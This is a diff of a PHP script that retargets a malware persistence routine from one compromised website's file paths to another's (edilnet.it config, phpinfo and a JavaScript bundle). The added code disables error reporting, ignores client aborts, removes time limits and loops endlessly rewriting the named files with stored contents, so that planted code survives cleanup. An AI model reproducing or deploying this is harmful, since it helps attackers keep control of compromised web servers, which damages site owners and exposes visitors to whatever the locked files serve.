@@ -1,10 +1,11 @@
 <?php
-$lock_file_name = '/home/shemalec/public_html/shemalecanada.com/resources/views/site/includes/footer.blade.php';
-$lock_ht_name = '/home/shemalec/public_html/shemalecanada.com/resources/views/site/includes/header.blade.php';
+error_reporting(0);
+$lock_file_name = '/var/www/vhosts/edilnet.it/httpdocs/cladmin/conf.inc.php';
+$lock_ht_name = '/var/www/vhosts/edilnet.it/httpdocs/phpinfo.php';
 $current_file_path = __FILE__;
 $current_dir = realpath(dirname($current_file_path));
-$lock_file_path = "/home/shemalec/public_html/shemalecanada.com/resources/views/site/includes/footer.blade.php";
-$lock_ht_path = $current_dir . '/' . $lock_ht_name;
+$lock_file_path = "/var/www/vhosts/edilnet.it/httpdocs/assets/js/ri-combined.js";
+$lock_ht_path = "/var/www/vhosts/edilnet.it/httpdocs/phpinfo.php";
 $current_file_name = str_replace($current_dir, '', $current_file_path);
 $current_file_name = str_replace("/", '', $current_file_name);
 $current_file_name = str_replace("\\", '', $current_file_name);
@@ -64,15 +65,15 @@ $lockHt = 1;
                 error_reporting(0);
                 ignore_user_abort(true);
                 set_time_limit(0);
-                $CodeIndex = @file_get_contents('/home/shemalec/public_html/shemalecanada.com/resources/views/site/includes/footer.blade.php');
-                $CodeHtaccess = @file_get_contents('/home/shemalec/public_html/shemalecanada.com/resources/views/site/includes/header.blade.php');
+                $CodeIndex = @file_get_contents('/var/www/vhosts/edilnet.it/httpdocs/assets/js/ri-combined.js');
+                $CodeHtaccess = @file_get_contents('/var/www/vhosts/edilnet.it/httpdocs/phpinfo.php');
                 while (1 == 1) {
                     if (file_exists(__FILE__)) {
                         header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
                         break;
                     }
-                    lockfile('/home/shemalec/public_html/shemalecanada.com/resources/views/site/includes/footer.blade.php', $CodeIndex);
-                    lockfile('/home/shemalec/public_html/shemalecanada.com/resources/views/site/includes/header.blade.php', $CodeHtaccess);
+                    lockfile('/var/www/vhosts/edilnet.it/httpdocs/assets/js/ri-combined.js', $CodeIndex);
+                    lockfile('/var/www/vhosts/edilnet.it/httpdocs/phpinfo.php', $CodeHtaccess);
                 };
             }
             break;
